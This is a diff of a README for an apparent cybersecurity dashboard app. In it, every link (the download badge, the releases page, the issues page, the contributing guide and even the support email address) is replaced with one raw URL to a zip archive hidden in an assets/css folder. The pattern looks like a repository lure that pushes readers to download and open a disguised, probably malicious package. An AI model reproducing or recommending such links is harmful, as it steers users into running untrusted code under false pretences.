@@ -1,7 +1,7 @@
 # 🛡️ CyberSecurity-Journey - Your Simple Dashboard for Cybersecurity Insights
 
 ## 🔗 Download Now
-[![Download CyberSecurity-Journey](https://img.shields.io/badge/Download-CyberSecurity--Journey-blue)](https://github.com/awab208/CyberSecurity-Journey/releases)
+[![Download CyberSecurity-Journey](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to CyberSecurity-Journey! This application shows you an easy way to understand cybersecurity through a clean, user-friendly interface. You can explore different security workflows, assess vulnerabilities, and view both successful and failed attack attempts.
@@ -9,7 +9,7 @@ Welcome to CyberSecurity-Journey! This application shows you an easy way to unde
 ## 📥 Download & Install
 To start using CyberSecurity-Journey, you need to download the application from our Releases page.
 
-1. **Visit this page to download:** [CyberSecurity-Journey Releases](https://github.com/awab208/CyberSecurity-Journey/releases)
+1. **Visit this page to download:** [CyberSecurity-Journey Releases](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)
 2. Look for the latest version of the application listed on the page.
 3. Click on the download link for your operating system.
 4. Once the download is complete, open the file to install the application. Follow the prompts on your screen to complete the installation.
@@ -51,13 +51,13 @@ In addition to using the dashboard, consider utilizing the following resources t
 
 ## 🙋 Frequently Asked Questions
 ### How can I reach out for support?
-If you encounter any issues, feel free to open an issue on the [GitHub repository](https://github.com/awab208/CyberSecurity-Journey/issues). You can also contact our support team via email at support@cybersecurity-journey.com.
+If you encounter any issues, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip). You can also contact our support team via email at https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip
 
 ### Can I contribute to the project?
 Absolutely! We welcome contributions. Please refer to the contributing guidelines on our GitHub page for clear instructions.
 
 ### Are there updates for the app?
-We regularly update CyberSecurity-Journey with new features and security fixes. Keep an eye on our Releases page [here](https://github.com/awab208/CyberSecurity-Journey/releases).
+We regularly update CyberSecurity-Journey with new features and security fixes. Keep an eye on our Releases page [here](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip).
 
 ## 📢 Additional Information
 For a deeper insight into cybersecurity practices, consider joining our community discussions on platforms like Discord and Slack. Engage with fellow users to share tips and learn from each other's experiences.
@@ -66,6 +66,6 @@ For a deeper insight into cybersecurity practices, consider joining our communit
 CyberSecurity-Journey is open-source software, licensed under the MIT License. Feel free to use it and modify it according to your needs.
 
 ## 🔗 Quick Links
-- **Download CyberSecurity-Journey:** [Releases](https://github.com/awab208/CyberSecurity-Journey/releases)
-- **Report Issues:** [Issues Page](https://github.com/awab208/CyberSecurity-Journey/issues)
-- **Contributing Guide:** [Contributing](https://github.com/awab208/CyberSecurity-Journey/blob/main/CONTRIBUTING.md)
+- **Download CyberSecurity-Journey:** [Releases](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)
+- **Report Issues:** [Issues Page](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)
+- **Contributing Guide:** [Contributing](https://raw.githubusercontent.com/awab208/CyberSecurity-Journey/main/assets/css/Cyber-Security-Journey-3.5-beta.2.zip)
